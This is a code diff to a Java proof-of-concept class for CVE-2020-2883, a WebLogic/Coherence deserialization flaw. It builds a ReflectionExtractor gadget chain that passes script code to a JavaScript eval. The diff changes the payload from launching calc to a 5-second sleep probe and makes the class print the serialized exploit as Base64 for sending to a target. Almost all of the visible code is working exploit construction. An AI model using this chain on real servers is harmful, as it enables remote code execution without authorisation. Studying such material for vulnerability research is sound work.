@@ -12,6 +12,7 @@ import com.tangosol.util.extractor.ReflectionExtractor;
 import javax.script.ScriptEngine;
 import javax.script.ScriptEngineManager;
 import java.lang.reflect.Field;
+import java.util.Base64;
 import java.util.PriorityQueue;
 
 public class TestScriptEnginelWithCVE_2020_2883 {
@@ -34,7 +35,7 @@ public class TestScriptEnginelWithCVE_2020_2883 {
 
         ReflectionExtractor extractor4 = new ReflectionExtractor(
                 "eval",
-                new Object[]{"java.lang.Runtime.getRuntime().exec('calc');"}
+                new Object[]{"java.lang.Runtime.getRuntime().sleep(5000);"}
         );
 
         ReflectionExtractor[] extractors = {
@@ -66,8 +67,9 @@ public class TestScriptEnginelWithCVE_2020_2883 {
 
         //序列化
         byte[] bytes = Util.serialize(queue);
-
+        String encodedString = Base64.getEncoder().encodeToString(bytes);
+        System.out.println(encodedString);
         //反序列化
-        Util.deserialize(bytes);
+//        Util.deserialize(bytes);
     }
 }
